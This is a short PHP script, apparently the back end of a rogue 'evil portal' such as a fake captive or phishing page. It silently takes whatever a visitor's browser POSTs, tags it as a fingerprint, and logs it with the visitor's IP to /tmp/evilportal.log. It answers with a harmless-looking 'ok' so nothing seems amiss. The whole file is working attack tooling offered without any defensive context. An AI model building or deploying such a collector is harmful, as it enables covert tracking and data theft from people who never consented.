<?php
// Silent data collector for pre-flight requests
$logFile = "/tmp/evilportal.log";

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input = file_get_contents('php://input');
    $clientIP = $_SERVER['REMOTE_ADDR'];
    $timestamp = date("Y-m-d H:i:s");

    $entry = sprintf("[%s] IP: %s | FINGERPRINT: %s\n", $timestamp, $clientIP, $input);
    file_put_contents($logFile, $entry, FILE_APPEND | LOCK_EX);

    header('Content-Type: application/json');
    echo json_encode(['status' => 'ok']);
    exit();
}
?>
